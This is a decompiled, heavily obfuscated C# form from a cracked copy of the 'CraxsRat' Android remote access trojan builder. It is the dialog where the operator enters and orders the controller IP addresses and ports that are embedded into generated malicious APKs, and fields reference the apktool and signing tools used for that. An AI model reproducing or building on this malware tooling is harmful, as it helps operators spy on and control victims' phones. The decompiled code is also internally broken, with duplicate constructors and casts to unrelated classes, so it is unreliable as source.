// Decompiled with JetBrains decompiler
// Type: Craxs_Rat.EditSocket
// Assembly: CraxsRat, Version=6.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 518449F5-7012-4EDA-9924-A26EC676C6A1
// Assembly location: C:\Users\HP\Downloads\CraxsRat v6.8 by TG @Hackfilter - Copy\CraxsRat VIP\CraxsRat_protected.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

#nullable disable
namespace Craxs_Rat
{
  [DesignerGenerated]
  public class EditSocket : Form
  {
    private string ClassesPath;
    private string stringspath;
    private string stubicon;
    private string BASEPATH;
    private string STUBPATH;
    private string apktoolpath;
    private string Apksignerpath;
    private string ApkZIPpath;
    private string Apkeditorpath;
    private string C;
    private string K;
    private string MainfistPath;
    private string ClassGen1;
    private string ClassGen2;
    private string ClassGen3;
    private string ClassGen4;

    internal virtual Panel PanelBOX
    {
      get => ((FileManager) this)._PanelBOX;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        PaintEventHandler paintEventHandler = new PaintEventHandler(this.PanelBOX_Paint);
label_1:
        int num1 = 536785893;
        Panel panelBox;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) ~((-(num1 * 590128507 ^ ~---2077467413) ^ ~(1426670861 - 864209295)) * 427716787)) % 8U)
          {
            case 0:
              goto label_3;
            case 1:
              int num3 = panelBox == null ? -1649192227 : (num3 = -884154983);
              num1 = num3 ^ (int) num2 * 2104284717;
              continue;
            case 2:
              panelBox = ((FileManager) this)._PanelBOX;
              num1 = (int) num2 * 1765458304 ^ -1002739301;
              continue;
            case 3:
              panelBox = ((FileManager) this)._PanelBOX;
              int num4 = panelBox == null ? -160643930 : (num4 = 676815783);
              num1 = num4 ^ (int) num2 * -2069342109;
              continue;
            case 4:
              panelBox.Paint += paintEventHandler;
              num1 = (int) num2 * -745052373 ^ 530637340;
              continue;
            case 5:
              ((FileManager) this)._PanelBOX = value;
              num1 = 155800866;
              continue;
            case 6:
              panelBox.Paint -= paintEventHandler;
              num1 = (int) num2 * -948295574 ^ -1139520933;
              continue;
            case 7:
              goto label_1;
            default:
              goto label_10;
          }
        }
label_3:
        return;
label_10:;
      }
    }

    internal virtual Button btnUp
    {
      get => ((FileManager) this)._btnUp;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.btnUp_Click);
label_1:
        int num1 = -29988744;
        Button btnUp;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) ~((~(num1 - ~-(-1220716315 * (1788580968 * -1861381553) - (55308809 ^ 502094746 ^ 256161971 * -1022831609)) ^ ~(-1696427151 * 1530909194)) ^ (18285141 ^ 854391878) * 570313283) - --677334937)) % 9U)
          {
            case 0:
              btnUp.Click -= eventHandler;
              num1 = (int) num2 * -1318577534 ^ -1031807249;
              continue;
            case 1:
              btnUp.Click += eventHandler;
              num1 = (int) num2 * 348916720 ^ 464229637;
              continue;
            case 2:
              goto label_1;
            case 3:
              goto label_3;
            case 4:
              ((FileManager) this)._btnUp = value;
              num1 = 1487395654;
              continue;
            case 5:
              btnUp = ((FileManager) this)._btnUp;
              num1 = (int) num2 * 1272869666 ^ 1556125151;
              continue;
            case 6:
              int num3 = btnUp == null ? -2078432737 : (num3 = 901939718);
              num1 = num3 ^ (int) num2 * -946505020;
              continue;
            case 7:
              btnUp = ((FileManager) this)._btnUp;
              num1 = (int) num2 * 1014486230 ^ 1491746212;
              continue;
            case 8:
              int num4 = btnUp == null ? 187847301 : (num4 = 1317883189);
              num1 = num4 ^ (int) num2 * -872059748;
              continue;
            default:
              goto label_11;
          }
        }
label_3:
        return;
label_11:;
      }
    }

    internal virtual Button btnDown
    {
      get => ((FileManager) this)._btnDown;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.btnDown_Click);
        Button btnDown = ((FileManager) this)._btnDown;
        if (btnDown == null)
          goto label_5;
label_1:
        int num1 = 987927387;
label_2:
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (~~num1 * -242826755 - ((1157843291 ^ 607649516) + (1442778743 ^ -1287384943)) - (2025285340 - 1642338668) - 870234158)) % 5U)
          {
            case 0:
              goto label_5;
            case 1:
              goto label_3;
            case 2:
              btnDown.Click += eventHandler;
              num1 = (int) num2 * -741638243 ^ 530610285;
              continue;
            case 3:
              goto label_1;
            case 4:
              btnDown.Click -= eventHandler;
              num1 = (int) num2 * -604875693 ^ 502221791;
              continue;
            default:
              goto label_7;
          }
        }
label_3:
        return;
label_7:
        return;
label_5:
        ((FileManager) this)._btnDown = value;
        btnDown = ((FileManager) this)._btnDown;
        num1 = btnDown == null ? 611011638 : (num1 = 1931155578);
        goto label_2;
      }
    }

    internal virtual Label T0
    {
      get => ((FileManager) this)._T0;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((FileManager) this)._T0 = value;
    }

    internal virtual Label Label2
    {
      get => ((FileManager) this)._Label2;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((FileManager) this)._Label2 = value;
    }

    internal virtual Label Label1
    {
      get => ((FileManager) this)._Label1;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((FileManager) this)._Label1 = value;
    }

    internal virtual Button b_Add
    {
      get => ((FileManager) this)._b_Add;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.b_Add_Click);
        Button bAdd = ((FileManager) this)._b_Add;
label_1:
        int num1 = -1537470912;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) ~(-(~(num1 + ((---1903650548 ^ --~-1085717016) + ~(2049356033 * -669679904 ^ ~-1962578560 ^ --1002100899 ^ -620677871 * 935641134))) - (~-710158544 + -(2143949535 - 1425031369))) ^ 1261352695 - 823113003)) % 7U)
          {
            case 0:
              goto label_3;
            case 1:
              int num3 = bAdd == null ? 1731076891 : (num3 = 1512961340);
              num1 = num3 ^ (int) num2 * -323803730;
              continue;
            case 2:
              bAdd = ((FileManager) this)._b_Add;
              int num4 = bAdd == null ? -1715153370 : (num4 = 1874578478);
              num1 = num4 ^ (int) num2 * 284177727;
              continue;
            case 3:
              goto label_1;
            case 4:
              ((FileManager) this)._b_Add = value;
              num1 = -1214441111;
              continue;
            case 5:
              bAdd.Click -= eventHandler;
              num1 = (int) num2 * 1788387161 ^ -500193958;
              continue;
            case 6:
              bAdd.Click += eventHandler;
              num1 = (int) num2 * 1668688354 ^ -1398197256;
              continue;
            default:
              goto label_9;
          }
        }
label_3:
        return;
label_9:;
      }
    }

    internal virtual Button b_del
    {
      get => ((FileManager) this)._b_del;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.b_del_Click);
label_1:
        int num1 = -2034433558;
        while (true)
        {
          int num2 = num1;
          uint num3;
          Button bDel;
          switch ((num3 = (uint) ((-1773809764 - -1084477205 - ((-348109551 ^ ~1402387114) - ~(-1765313405 - 1841322928) - ~(num2 * 1844507897)) * -100117839) * 946282659)) % 7U)
          {
            case 0:
              bDel.Click += eventHandler;
              num1 = (int) num3 * -897316285 ^ 1580130498;
              continue;
            case 1:
              bDel.Click -= eventHandler;
              num1 = (int) num3 * 486908799 ^ -1552949175;
              continue;
            case 2:
              bDel = ((FileManager) this)._b_del;
              int num4 = bDel == null ? 1428496481 : (num4 = -1910535501);
              num1 = num4 ^ (int) num3 * -2068693367;
              continue;
            case 3:
              goto label_1;
            case 4:
              bDel = ((FileManager) this)._b_del;
              int num5 = bDel == null ? -1818534659 : (num5 = 294714728);
              num1 = num5 ^ (int) num3 * -144272579;
              continue;
            case 5:
              goto label_3;
            case 6:
              ((FileManager) this)._b_del = value;
              num1 = 62188739;
              continue;
            default:
              goto label_9;
          }
        }
label_3:
        return;
label_9:;
      }
    }

    internal virtual DataGridView DGV0
    {
      get => ((FileManager) this)._DGV0;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((FileManager) this)._DGV0 = value;
    }

    internal virtual DataGridViewTextBoxColumn Column2
    {
      get => ((FileManager) this)._Column2;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((FileManager) this)._Column2 = value;
    }

    internal virtual TextBox TextIP
    {
      get => ((FileManager) this)._TextIP;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((FileManager) this)._TextIP = value;
    }

    internal virtual Button OKY
    {
      get => ((FileManager) this)._OKY;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.OKY_Click);
label_1:
        int num1 = 2079267679;
        Button oky;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) ((-(num1 ^ ~(1728557272 ^ -1347226555)) - (1414228863 + 1574306887 - -67863505 * -925610376 + 1194547003 * -374229932) ^ ~(135279937 + 18238915) ^ ~1319591883) - -1236045277)) % 7U)
          {
            case 0:
              goto label_1;
            case 1:
              goto label_3;
            case 2:
              oky = ((FileManager) this)._OKY;
              num1 = (int) num2 * 1266696779 ^ 181095806;
              continue;
            case 3:
              oky.Click -= eventHandler;
              num1 = (int) num2 * 1674909072 ^ 342067468;
              continue;
            case 4:
              int num3 = oky == null ? 707487329 : (num3 = 163811987);
              num1 = num3 ^ (int) num2 * -201407313;
              continue;
            case 5:
              oky.Click += eventHandler;
              num1 = (int) num2 * -1581548086 ^ -1786920134;
              continue;
            case 6:
              ((FileManager) this)._OKY = value;
              oky = ((FileManager) this)._OKY;
              int num4;
              num1 = num4 = oky == null ? -1399430546 : (num4 = -1498087682);
              continue;
            default:
              goto label_9;
          }
        }
label_3:
        return;
label_9:;
      }
    }

    internal virtual NumericUpDown po
    {
      get => ((FileManager) this)._po;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((FileManager) this)._po = value;
    }

    internal virtual Timer TOpacity
    {
      get => ((FileManager) this)._TOpacity;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.TOpacity_Tick);
label_1:
        int num1 = 973765266;
        Timer topacity;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) ~((num1 + (-73453399 * (-2123112241 * (-624553412 ^ 1597592734 ^ 2115559764 + 1915377019)) ^ -(1970467268 + (-1029979399 - 531616702)) - -1217974711) ^ -(472853983 * -1309833765 ^ (1088092304 - 982016288) * 476407341) ^ -((1824836188 ^ -1782923257) - (1260924285 - 2033245864))) - (~1031336815 - (-761665761 - 743118888)) + (1662533467 ^ -2121967886))) % 8U)
          {
            case 0:
              goto label_1;
            case 1:
              topacity.Tick -= eventHandler;
              num1 = (int) num2 * -487049023 ^ 317025776;
              continue;
            case 2:
              ((FileManager) this)._TOpacity = value;
              num1 = 49365533;
              continue;
            case 3:
              topacity = ((FileManager) this)._TOpacity;
              num1 = (int) num2 * 2140177632 ^ 17270624;
              continue;
            case 4:
              topacity.Tick += eventHandler;
              num1 = (int) num2 * 1318652932 ^ 1350156998;
              continue;
            case 5:
              int num3 = topacity == null ? -1942578129 : (num3 = -1739409502);
              num1 = num3 ^ (int) num2 * 1592630742;
              continue;
            case 6:
              topacity = ((FileManager) this)._TOpacity;
              int num4 = topacity == null ? 1962058000 : (num4 = 1954870929);
              num1 = num4 ^ (int) num2 * 78284605;
              continue;
            case 7:
              goto label_3;
            default:
              goto label_10;
          }
        }
label_3:
        return;
label_10:;
      }
    }

    public EditSocket()
    {
      this.Load += new EventHandler(this.EditSocket_Load);
      ((FileManager) this).RectInputText0 = new List<Rectangle>();
      ((Editor) this).InitializeComponent();
      this.Font = Settings.f;
    }

    private void SpyStyle()
    {
      this.po.BackColor = Settings.DefaultColor_Background;
      this.po.ForeColor = getIconFrmReg.SHFILEINFOW.DefaultColor_Foreground;
      List<Rectangle> rectInputText0 = ((FileManager) this).RectInputText0;
      Point location = this.po.Location;
      int x = checked (location.X - 1);
      location = this.po.Location;
      int y = checked (location.Y - 1);
      int width = checked (this.po.Width + 1);
      int height = checked (this.po.Height + 1);
      Rectangle rectangle = new Rectangle(x, y, width, height);
      rectInputText0.Add(rectangle);
      IEnumerator<DataGridView> enumerator1;
      try
      {
        enumerator1 = this.PanelBOX.Controls.OfType<DataGridView>().GetEnumerator();
label_9:
        int num1 = enumerator1.MoveNext() ? -1117296069 : (num1 = 1919923942);
        while (true)
        {
          int num2 = num1;
          uint num3;
          DataGridView current;
          switch ((num3 = (uint) ((-1910338185 ^ 1672476185) - (-1235752225 * (186555121 * 2022415870) - (~num2 * -1533874579 + (1825394708 - -(-1632131521 - 827149304)))) ^ -502212418)) % 8U)
          {
            case 0:
              current.BackColor = Settings.DefaultColor_Background;
              current.ColumnHeadersDefaultCellStyle.BackColor = Settings.DefaultColor_Background;
              num1 = (int) num3 * 1563391264 ^ 1113474152;
              continue;
            case 1:
              goto label_9;
            case 3:
              current.ColumnHeadersDefaultCellStyle.ForeColor = getIconFrmReg.SHFILEINFOW.DefaultColor_Foreground;
              num1 = (int) num3 * -736491379 ^ -1850032200;
              continue;
            case 4:
              current.DefaultCellStyle.BackColor = Settings.DefaultColor_Background;
              num1 = (int) num3 * 1346880973 ^ 191243798;
              continue;
            case 5:
              current = enumerator1.Current;
              current.BackgroundColor = Settings.DefaultColor_Background;
              num1 = -836944972;
              continue;
            case 6:
              current.DefaultCellStyle.SelectionForeColor = Settings.DefaultColor_Background;
              current.DefaultCellStyle.ForeColor = getIconFrmReg.SHFILEINFOW.DefaultColor_Foreground;
              current.DefaultCellStyle.SelectionBackColor = getIconFrmReg.SHFILEINFOW.DefaultColor_Foreground;
              num1 = (int) num3 * 1640660233 ^ -1517500321;
              continue;
            case 7:
              num1 = -1117296069;
              continue;
            default:
              goto label_15;
          }
        }
      }
      finally
      {
        if (enumerator1 != null)
        {
label_11:
          int num4 = -1152873458;
          while (true)
          {
            int num5 = num4;
            uint num6;
            switch ((num6 = (uint) ((-1910338185 ^ 1672476185) - (-1235752225 * (186555121 * 2022415870) - (~num5 * -1533874579 + (1825394708 - -(-1632131521 - 827149304)))) ^ -502212418)) % 3U)
            {
              case 1:
                enumerator1.Dispose();
                num4 = (int) num6 * -478033952 ^ 1251741740;
                continue;
              case 2:
                goto label_11;
              default:
                goto label_14;
            }
          }
        }
label_14:;
      }
label_15:
      IEnumerator<Label> enumerator2;
      try
      {
        enumerator2 = this.PanelBOX.Controls.OfType<Label>().GetEnumerator();
label_16:
        int num7 = -826306;
        while (true)
        {
          int num8 = num7;
          uint num9;
          switch ((num9 = (uint) ((-1910338185 ^ 1672476185) - (-1235752225 * (186555121 * 2022415870) - (~num8 * -1533874579 + (1825394708 - -(-1632131521 - 827149304)))) ^ -502212418)) % 5U)
          {
            case 0:
              enumerator2.Current.ForeColor = getIconFrmReg.SHFILEINFOW.DefaultColor_Foreground;
              num7 = 1630766023;
              continue;
            case 1:
              num7 = (int) num9 * -9276982 ^ 385452643;
              continue;
            case 2:
              goto label_16;
            case 4:
              int num10;
              num7 = num10 = enumerator2.MoveNext() ? 298646886 : (num10 = -851859029);
              continue;
            default:
              goto label_26;
          }
        }
      }
      finally
      {
        if (enumerator2 != null)
        {
label_22:
          int num11 = 253337632;
          while (true)
          {
            int num12 = num11;
            uint num13;
            switch ((num13 = (uint) ((-1910338185 ^ 1672476185) - (-1235752225 * (186555121 * 2022415870) - (~num12 * -1533874579 + (1825394708 - -(-1632131521 - 827149304)))) ^ -502212418)) % 3U)
            {
              case 0:
                goto label_22;
              case 1:
                enumerator2.Dispose();
                num11 = (int) num13 * 305403105 ^ -560454432;
                continue;
              default:
                goto label_25;
            }
          }
        }
label_25:;
      }
label_26:
      IEnumerator<Button> enumerator3;
      try
      {
        enumerator3 = this.PanelBOX.Controls.OfType<Button>().GetEnumerator();
label_27:
        int num14 = 1190213327;
        while (true)
        {
          int num15 = num14;
          uint num16;
          Button current;
          switch ((num16 = (uint) ((-1910338185 ^ 1672476185) - (-1235752225 * (186555121 * 2022415870) - (~num15 * -1533874579 + (1825394708 - -(-1632131521 - 827149304)))) ^ -502212418)) % 6U)
          {
            case 0:
              current = enumerator3.Current;
              current.BackColor = getIconFrmReg.SHFILEINFOW.DefaultColor_Foreground;
              num14 = 248221656;
              continue;
            case 1:
              num14 = (int) num16 * -2016105369 ^ -378024118;
              continue;
            case 2:
              goto label_27;
            case 3:
              int num17;
              num14 = num17 = enumerator3.MoveNext() ? 848633572 : (num17 = -1650120143);
              continue;
            case 4:
              current.ForeColor = Settings.DefaultColor_Background;
              num14 = (int) num16 * 150517824 ^ -1820401995;
              continue;
            default:
              goto label_38;
          }
        }
      }
      finally
      {
        if (enumerator3 != null)
        {
label_34:
          int num18 = -1307949912;
          while (true)
          {
            int num19 = num18;
            uint num20;
            switch ((num20 = (uint) ((-1910338185 ^ 1672476185) - (-1235752225 * (186555121 * 2022415870) - (~num19 * -1533874579 + (1825394708 - -(-1632131521 - 827149304)))) ^ -502212418)) % 3U)
            {
              case 1:
                enumerator3.Dispose();
                num18 = (int) num20 * 307617826 ^ 556598862;
                continue;
              case 2:
                goto label_34;
              default:
                goto label_37;
            }
          }
        }
label_37:;
      }
label_38:
      IEnumerator<TextBox> enumerator4;
      try
      {
        enumerator4 = this.PanelBOX.Controls.OfType<TextBox>().GetEnumerator();
label_39:
        int num21 = -1831886933;
        while (true)
        {
          int num22 = num21;
          uint num23;
          TextBox current;
          switch ((num23 = (uint) ((-1910338185 ^ 1672476185) - (-1235752225 * (186555121 * 2022415870) - (~num22 * -1533874579 + (1825394708 - -(-1632131521 - 827149304)))) ^ -502212418)) % 6U)
          {
            case 0:
              current.BackColor = Settings.DefaultColor_Background;
              current.ForeColor = getIconFrmReg.SHFILEINFOW.DefaultColor_Foreground;
              ((FileManager) this).RectInputText0.Add(new Rectangle(checked (current.Location.X - 1), checked (current.Location.Y - 1), checked (current.Width + 1), checked (current.Height + 1)));
              num21 = (int) num23 * 450543383 ^ -1625897814;
              continue;
            case 1:
              num21 = (int) num23 * 873321801 ^ -1845509517;
              continue;
            case 2:
              int num24;
              num21 = num24 = enumerator4.MoveNext() ? -1795443510 : (num24 = 187203033);
              continue;
            case 3:
              goto label_39;
            case 4:
              current = enumerator4.Current;
              num21 = -684883560;
              continue;
            default:
              goto label_50;
          }
        }
      }
      finally
      {
        if (enumerator4 != null)
        {
label_46:
          int num25 = -898785105;
          while (true)
          {
            int num26 = num25;
            uint num27;
            switch ((num27 = (uint) ((-1910338185 ^ 1672476185) - (-1235752225 * (186555121 * 2022415870) - (~num26 * -1533874579 + (1825394708 - -(-1632131521 - 827149304)))) ^ -502212418)) % 3U)
            {
              case 0:
                goto label_46;
              case 1:
                enumerator4.Dispose();
                num25 = (int) num27 * 399105 ^ -580593996;
                continue;
              default:
                goto label_49;
            }
          }
        }
label_49:;
      }
label_50:
      IEnumerator<Panel> enumerator5;
      try
      {
        enumerator5 = this.Controls.OfType<Panel>().GetEnumerator();
label_54:
        int num28 = enumerator5.MoveNext() ? 811397662 : (num28 = 1806877216);
        while (true)
        {
          int num29 = num28;
          uint num30;
          Panel current;
          switch ((num30 = (uint) ((-1910338185 ^ 1672476185) - (-1235752225 * (186555121 * 2022415870) - (~num29 * -1533874579 + (1825394708 - -(-1632131521 - 827149304)))) ^ -502212418)) % 5U)
          {
            case 0:
              num28 = 811397662;
              continue;
            case 1:
              current = enumerator5.Current;
              num28 = -352777624;
              continue;
            case 3:
              goto label_54;
            case 4:
              current.BackColor = Settings.DefaultColor_Background;
              num28 = (int) num30 * 280290593 ^ -1411156903;
              continue;
            default:
              goto label_61;
          }
        }
      }
      finally
      {
        if (enumerator5 != null)
        {
label_57:
          int num31 = 1459673401;
          while (true)
          {
            int num32 = num31;
            uint num33;
            switch ((num33 = (uint) ((-1910338185 ^ 1672476185) - (-1235752225 * (186555121 * 2022415870) - (~num32 * -1533874579 + (1825394708 - -(-1632131521 - 827149304)))) ^ -502212418)) % 3U)
            {
              case 0:
                goto label_57;
              case 1:
                enumerator5.Dispose();
                num31 = (int) num33 * -221910503 ^ 56381222;
                continue;
              default:
                goto label_60;
            }
          }
        }
label_60:;
      }
label_61:
      this.Refresh();
    }

    private void TOpacity_Tick(object sender, EventArgs e)
    {
      if (this.Opacity == 1.0)
        goto label_6;
label_1:
      int num1 = 1881040072;
label_2:
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) ~(~(-num1 - (-(-2130843617 - ~1687771428) + ~(533249311 + 1248964289) * 1438672733)) + -(-458741324 * 480551709) + (-2027299936 ^ -347167256))) % 5U)
        {
          case 0:
            num1 = (int) num2 * 1751749994 ^ -472669910;
            continue;
          case 1:
            this.Opacity += 0.1;
            num1 = (int) num2 * -859469666 ^ -497043999;
            continue;
          case 2:
            goto label_3;
          case 3:
            goto label_6;
          case 4:
            goto label_1;
          default:
            goto label_7;
        }
      }
label_3:
      return;
label_7:
      return;
label_6:
      this.TOpacity.Enabled = false;
      num1 = -1986057130;
      goto label_2;
    }

    private void EditSocket_Load(object sender, EventArgs e)
    {
      this.Icon = new Icon(Settings.res_Path + EXGuarder.\u0036A12026B);
label_1:
      int num1 = 1931788008;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (~(num1 ^ ~(530781559 * ~(1242572306 + 1884284628 - (-1265053940 ^ 2005212209)))) - 1543379199 ^ -(-88397608 - -1406087831))) % 5U)
        {
          case 0:
            goto label_3;
          case 1:
            this.SpyStyle();
            num1 = (int) num2 * 788333442 ^ 1840950337;
            continue;
          case 2:
            this.TextIP.Text = Codes.GetIPAddress();
            num1 = (int) num2 * -1699957010 ^ -2055433855;
            continue;
          case 3:
            goto label_1;
          case 4:
            this.TOpacity.Interval = Settings.T_Interval;
            this.TOpacity.Enabled = true;
            num1 = (int) num2 * -1253500722 ^ -963675835;
            continue;
          default:
            goto label_7;
        }
      }
label_3:
      return;
label_7:;
    }

    private void b_Add_Click(object sender, EventArgs e)
    {
      this.DGV0.Rows.Add(new object[1]
      {
        (object) (this.TextIP.Text + EXGuarder.\u0035E52196D + Conversions.ToString(this.po.Value))
      });
    }

    private void b_del_Click(object sender, EventArgs e)
    {
      if (this.DGV0.SelectedRows.Count <= 0)
        return;
label_1:
      int num1 = 1991502646;
      int index;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) ((~(num1 - ---1614067572 + ((1354276691 ^ 73495097) - 233004128 ^ -(1678960008 - -286546146) ^ -1405639999 * -1807916272 * 916214791 - -(-1075593206 - -600956913))) + (-1795705266 - -1460069791 * 1371503339)) * -1296033947 - -455395214)) % 6U)
        {
          case 0:
            goto label_1;
          case 1:
            goto label_8;
          case 2:
            num1 = (int) num2 * -1960523561 ^ 1765357930;
            continue;
          case 3:
            int num3;
            num1 = num3 = index >= 0 ? 1319726045 : (num3 = -891804780);
            continue;
          case 4:
            this.DGV0.Rows.RemoveAt(this.DGV0.SelectedRows[index].Index);
            checked { index += -1; }
            num1 = -1510316538;
            continue;
          case 5:
            index = checked (this.DGV0.SelectedRows.Count - 1);
            num1 = (int) num2 * 208137654 ^ -1261704341;
            continue;
          default:
            goto label_9;
        }
      }
label_8:
      return;
label_9:;
    }

    private void btnUp_Click(object sender, EventArgs e) => this.Rowinsert(false);

    private void btnDown_Click(object sender, EventArgs e) => this.Rowinsert(true);

    private void Rowinsert(bool isDown)
    {
      if (!(this.DGV0.SelectedRows.Count == 1 & this.DGV0.Rows.Count != 1))
        return;
label_1:
      int num1 = -1075772483;
      while (true)
      {
        int num2 = num1;
        uint num3;
        int index;
        string str;
        switch ((num3 = (uint) (1165871125 * 866914831 - ((num2 ^ (615352093 ^ -1816044780 * -1301016877 - (1270216734 - 683074936 - (976851782 + 823059649))) + 254026951 * (712126255 * 1147172852 + -51246227 - (1303255087 - 1485216331) * -425101957)) - -815883988 * -634647785) + -~-266369923 ^ ~-1864739037 ^ -96847100)) % 15U)
        {
          case 0:
            num1 = (int) num3 * 1072281279 ^ -1642111964;
            continue;
          case 1:
            this.DGV0.Rows.Insert(checked (this.DGV0.SelectedRows[index].Index + 1), new object[1]
            {
              (object) str
            });
            num1 = (int) num3 * -620095907 ^ -935414091;
            continue;
          case 2:
            checked { index += -1; }
            num1 = -1668469251;
            continue;
          case 3:
            this.DGV0.Rows.RemoveAt(checked (this.DGV0.SelectedRows[index].Index + 1));
            this.DGV0.CurrentCell = this.DGV0.Rows[checked (this.DGV0.SelectedRows[index].Index - 1)].Cells[0];
            num1 = (int) num3 * -2064206178 ^ 1069165278;
            continue;
          case 4:
            this.DGV0.CurrentCell = this.DGV0.Rows[checked (this.DGV0.SelectedRows[index].Index + 1)].Cells[0];
            num1 = (int) num3 * 2063269994 ^ 1366427405;
            continue;
          case 5:
            index = checked (this.DGV0.SelectedRows.Count - 1);
            num1 = (int) num3 * -28925558 ^ -1407318109;
            continue;
          case 6:
            this.DGV0.Rows.RemoveAt(this.DGV0.SelectedRows[index].Index);
            num1 = (int) num3 * 268957701 ^ -345953742;
            continue;
          case 7:
            int num4;
            num1 = num4 = index >= 0 ? -1220797170 : (num4 = -756949613);
            continue;
          case 8:
            num1 = (int) num3 * 2060042499 ^ 458395891;
            continue;
          case 9:
            str = Conversions.ToString(this.DGV0.Rows[this.DGV0.SelectedRows[index].Index].Cells[0].Value);
            num1 = -696480650;
            continue;
          case 10:
            this.DGV0.Rows.Insert(checked (this.DGV0.SelectedRows[index].Index - 1), new object[1]
            {
              (object) str
            });
            this.DGV0.CurrentCell = this.DGV0.Rows[checked (this.DGV0.SelectedRows[index].Index - 1)].Cells[0];
            num1 = (int) num3 * -1392766844 ^ -1905580324;
            continue;
          case 11:
            int num5;
            num1 = num5 = this.DGV0.SelectedRows[index].Index == 0 ? -1118535398 : (num5 = -408985098);
            continue;
          case 12:
            goto label_1;
          case 13:
            goto label_17;
          case 14:
            int num6 = !isDown ? 498949675 : (num6 = -1268924433);
            num1 = num6 ^ (int) num3 * -462136726;
            continue;
          default:
            goto label_18;
        }
      }
label_17:
      return;
label_18:;
    }

    private void OKY_Click(object sender, EventArgs e) => this.DialogResult = DialogResult.OK;

    private void PanelBOX_Paint(object sender, PaintEventArgs e)
    {
      e.Graphics.SmoothingMode = SmoothingMode.AntiAlias;
label_1:
      int num1 = -589172898;
      Color defaultColorForeground;
      while (true)
      {
        int num2 = num1;
        uint num3;
        switch ((num3 = (uint) ((-(-1850479911 - 1025461812 ^ 1052986983 - -599381897) ^ -(-608702349 - -1950276472) + (668621237 - 2125053622) * -1247080829) - num2 * 319036941 ^ 72072933)) % 3U)
        {
          case 0:
            goto label_1;
          case 1:
            defaultColorForeground = getIconFrmReg.SHFILEINFOW.DefaultColor_Foreground;
            num1 = (int) num3 * 1523639471 ^ -1947987646;
            continue;
          default:
            goto label_5;
        }
      }
label_5:
      if (((FileManager) this).RectInputText0.Count <= 0)
        return;
      List<Rectangle>.Enumerator enumerator;
      try
      {
        enumerator = ((FileManager) this).RectInputText0.GetEnumerator();
label_7:
        int num4 = -842882435;
        while (true)
        {
          int num5 = num4;
          uint num6;
          Rectangle current;
          switch ((num6 = (uint) ((-(-1850479911 - 1025461812 ^ 1052986983 - -599381897) ^ -(-608702349 - -1950276472) + (668621237 - 2125053622) * -1247080829) - num5 * 319036941 ^ 72072933)) % 7U)
          {
            case 0:
              goto label_7;
            case 1:
              current = enumerator.Current;
              num4 = 1101270534;
              continue;
            case 2:
              num4 = (int) num6 * -1280196706 ^ -570078333;
              continue;
            case 3:
              int num7 = current.Width <= 0 ? -1977153281 : (num7 = -1138306126);
              num4 = num7 ^ (int) num6 * 1094106595;
              continue;
            case 4:
              e.Graphics.FillRectangle((Brush) new SolidBrush(defaultColorForeground), current);
              num4 = (int) num6 * -694268676 ^ 801726181;
              continue;
            case 5:
              int num8;
              num4 = num8 = enumerator.MoveNext() ? -1446952087 : (num8 = 1192479597);
              continue;
            case 6:
              goto label_9;
            default:
              goto label_3;
          }
        }
label_9:
        return;
label_3:;
      }
      finally
      {
        enumerator.Dispose();
      }
    }

    public EditSocket()
    {
      ((FileManager) this).Title = EXGuarder.\u0033A39123D;
      ((Faker) this).InitializeComponent();
    }

    [DebuggerNonUserCode]
    protected override void Dispose(bool disposing)
    {
      try
      {
        if (!disposing)
          return;
label_1:
        int num1 = 899264500;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) ((-(~(num1 ^ -(-832594339 * (-(-266081712 - -100799865) * 12369085))) ^ 1451782327 * 1974538413) ^ -1091504439 - -1243819864) - 607479721)) % 4U)
          {
            case 0:
              ((FileManager) this).components.Dispose();
              num1 = (int) num2 * 1034020652 ^ 18215942;
              continue;
            case 1:
              int num3 = ((FileManager) this).components == null ? -14869102 : (num3 = -45165707);
              num1 = num3 ^ (int) num2 * 1188023380;
              continue;
            case 2:
              goto label_1;
            case 3:
              goto label_3;
            default:
              goto label_8;
          }
        }
label_3:
        return;
label_8:;
      }
      finally
      {
        base.Dispose(disposing);
      }
    }
  }
}
